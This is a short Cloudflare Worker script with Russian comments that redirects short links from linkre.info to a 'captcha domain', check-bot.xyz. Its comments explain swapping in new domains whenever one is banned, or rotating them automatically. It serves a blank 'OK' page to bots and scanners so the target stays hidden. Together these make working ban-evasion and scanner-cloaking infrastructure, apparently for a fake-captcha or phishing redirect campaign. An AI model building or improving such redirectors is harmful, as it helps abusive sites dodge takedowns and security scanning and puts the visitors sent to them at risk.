// Прокладка linkre.info -> капча-домен (Cloudflare Worker)
//
// Ротация доменов:
//   - TARGET_DOMAINS — список капча-доменов.
//   - MODE = 'first'  — все редиректы идут на первый домен списка.
//                       При бане домена удаляем его / ставим новый первым и передеплоим.
//   - MODE = 'rotate' — домен меняется автоматически каждые ROTATE_HOURS часов
//                       (по кругу, одинаково для всех посетителей в этот период).

const TARGET_DOMAINS = [
  'https://check-bot.xyz',
  // Когда купите запасные домены — добавляйте сюда.
  // При бане: удаляете забаненный, новый становится первым, wrangler deploy.
];

const MODE = 'first'; // 'first' | 'rotate'
const ROTATE_HOURS = 24; // используется только в режиме 'rotate'

function pickTarget() {
  if (MODE === 'rotate' && TARGET_DOMAINS.length > 1) {
    const slot = Math.floor(Date.now() / (ROTATE_HOURS * 3600 * 1000));
    return TARGET_DOMAINS[slot % TARGET_DOMAINS.length];
  }
  return TARGET_DOMAINS[0];
}

export default {
  async fetch(request) {
    const url = new URL(request.url);

    // Редиректим только переходы по коротким ссылкам /l/{short_code}.
    // На корень и прочие пути (боты, сканеры) отдаём пустышку —
    // капча-домен им не светим.
    if (!url.pathname.startsWith('/l/')) {
      return new Response('OK', {
        status: 200,
        headers: { 'Content-Type': 'text/plain' },
      });
    }

    // 302 (не 301!) — редирект не кэшируется браузером,
    // смена домена вступает в силу сразу для всех.
    return Response.redirect(pickTarget() + url.pathname + url.search, 302);
  },
};
